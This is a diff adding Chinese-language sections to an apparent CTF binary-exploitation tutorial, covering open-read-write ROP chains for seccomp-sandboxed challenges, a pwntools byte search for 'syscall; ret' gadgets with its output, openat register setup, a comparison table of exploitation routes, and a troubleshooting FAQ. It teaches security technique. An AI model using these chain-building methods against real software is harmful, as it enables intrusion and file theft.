+> vuln 的 read 前有 `input> ` 提示符，`sendafter` 能对表；第一段链执行到 `read(0, staging, 0x10)` 时==没有任何输出==，第二拍（文件名）如果发得太早，会被 vuln 的 read 和它一并吞进同一次调用，链的节奏全乱。exp 里两拍之间隔了 0.5 秒——与 2.4 的"命令要等 shell 起来"是同一族问题：==对不上号的节拍，用间隔对齐==。
+
+> [!info]- syscall 的返回路径：本例为什么用字节检索
+> 链上的 open、read、write 执行完都要==返回到链上的下一格==，`syscall` 之后的那条指令就是下一站。2.4 的 execve 链没这个问题——execve 成功即替换进程，永不返回。本例 grep gadget 全量文件，`syscall ; ret` 一条都没有：0x401298 的裸 `syscall` 落在 `rt_sigprocmask` 的函数体中间，走过去就是别人的逻辑，链当场散架。两个可靠解法：
+>
+> ==字节检索 `0f 05 c3`==——机器码层面的 `syscall ; ret`。指令可以从不对齐的地址开始，所以在可执行段里按字节找，不怕它不落在任何指令的边界上：
+>
+> ```bash
+> python3 -c "
+> from pwn import *
+> context.log_level = 'error'
+> e = ELF('./orw_rop', checksec=False)
+> print([hex(a) for a in e.search(b'\x0f\x05\xc3')])
+> "
+> ```
+>
+> 输出：
+>
+> ```
+> ['0x412976', '0x412995', '0x421c09', '0x450490', '0x4642e9', '0x466ca9']
+> ```
+>
+> exp 取 0x421c09——它紧跟在 `__libc_write` 的 `syscall` 后面，地址好记。
+>
+> ==或者直接调 libc 函数==：nm 显示 `__libc_open`（0x421af0）、`__libc_read`（0x421b90）、`__libc_write`（0x421bb0）都已链入，把函数地址当 gadget 的 ret 落点用即可——不用装 rax、不用管返回路径，代价是依赖这几个符号恰好被静态链接进来。
+
+> [!info]- 沙箱只放行 openat 时
+> 现代 glibc 的 open 系函数内部全部走 `openat`，很多题的过滤器干脆只留 openat。链的改法：调用号换 257，参数四样——rdi = dirfd（相对路径的基准目录，"当前目录"用特殊值 `AT_FDCWD` = −100，装寄存器时写 `0xffffffffffffff9c`），rsi = 路径，rdx = flags，r10 = mode。r10 的 pop 片段少见，好在 O_RDONLY（0）打开时内核不读 mode，rdx = 0、r10 保持残留值即可；装 −100 与装普通常数无异，`pop rdi` 后面跟 `0xffffffffffffff9c` 就行。
+
+### 6.5 出口切换的定位
+
+ORW 改变的只有最后一步：==前置的偏移、泄露、控制流劫持，一切照旧==。它与前面的路线也不互斥——ret2libc 拿到第二轮的执行控制后，落点从 `system` 换成一条 ORW 链即可；堆题在 [[P16-FSOP与HouseofApple2#6. setcontext+0x35：一次调用换一整套寄存器|P16 第 6 节]]用 setcontext 把 rsp 搬到伪造的链上，搬过去跑的就是本章这条 ORW；[[P08-ROP进阶与SROP|P8]] 的 SROP 提供另一条整体控制寄存器的通道。本节的四个组件——==读过滤器、拼系统调用、管 fd、处理短读==——是所有沙箱题的公共基础；更复杂的限制（只留 openat 不留 open、把 write 换成 send 之类）打法相同：先 dump 白名单，再按它拼调用。
+
+## 7. 路线对比
+
+| | ret2syscall | ret2libc | one_gadget | ret2shellcode | ORW（第 6 节） |
+| ---- | ---- | ---- | ---- | ---- | ---- |
+| 目标 | shell | shell | shell | shell | 直读 flag |
+| 交互轮数 | 1 | 2 | 2（第二步一个地址） | 1 | 1–2 |
+| NX | 开着照用 | 开着照用 | 开着照用 | ==必须关== | ROP 版开着照用 |
+| 静态/动态 | 静态最有利（gadget 齐全） | 动态专属 | 动态专属 | 皆可 | 皆可，静态最顺 |
+| libc 信息 | 不需要 | ==必须确定版本== | 同左 | 不需要 | 不需要 |
+| 输出通道 | 不需要 | 必须能借到 | 同左 | 不需要 | `write` 自己就是输出通道 |
+| 常见失败原因 | 变体 gadget 的副作用没排序（如清 rax 的排在装号之后）；找不到 "/bin/sh" | 对齐没垫；版本不匹配（[[P03-ELF链接与延迟绑定\|P3]]）；泄露解析错位 | 约束不满足 | 坏字符；模板 push 蹭尾；页权限不对（bss） | fd 写死；写出长度用请求值；`syscall` 没有返回路径（6.4） |
+
+骨架是同一副：==偏移（P6）+ 填充 + 地址串==。选择时把第 1 节的四个问题过一遍，路线就能定下来；做不出来时，失败原因那一列就是排错起点。ORW 不与它们并列竞争：控制 rip 之前的一切相同，它只在最后一步把 getshell 换成直读 flag——沙箱题的选型从 `seccomp-tools dump` 的白名单开始。
+
+## 8. 常见问题
 
 | 现象 | 原因与解决 |
 | ---- | ---- |
@@ -1105,3 +1706,7 @@ mprotect 是改页权限的系统调用，[[04-汇编语言精要#10. 系统调�
 | 跳到 bss 里的 shellcode 段错误 | bss 页只有 rw 权限，`-z execstack` 只放开栈页；改走 jmp rsp 或 mprotect（5.4、5.5） |
 | execstack 编译后 checksec 的 NX 行写着 unknown | 该工具对这类二进制的判读口径问题：以 `readelf -lW` 里 GNU_STACK 的 RWE 为准（5.1 的 note） |
 | ROPgadget 搜不到想要的寄存器片段 | 朴素版没有就搜带搭头的变体，多垫废值；仍没有就把 `--depth` 加大或去 libc 里搜（[[P05-pwntools与GDB插件工具链#10. gadget 搜索：ROPgadget、ropper、one_gadget\|P5 第 10 节]]、2.3） |
+| 沙箱题流程全对，进程却死在 -31 | 调用了白名单外的系统调用（SIGSYS）：`seccomp-tools dump` 对照白名单逐个查（6.1） |
+| ORW 打出来是空内容或带脏数据 | 写出长度用了请求值而不是 read 的返回值（短读，6.3）；或 fd 号写死而 open 之前已有别的文件打开（6.3） |
+| ORW 链执行到第一个 syscall 后就跑飞 | 裸 `syscall` 的下一站是别家代码：链要续，用 `syscall ; ret`（字节检索 `0f 05 c3`）或直接调 libc 函数（6.4 折叠框） |
+| 第二拍文件名发过去没生效 | 链上的 read 没有提示符，发早了被 vuln 的 read 一口吞掉：两拍之间留间隔（6.4 的 warning） |
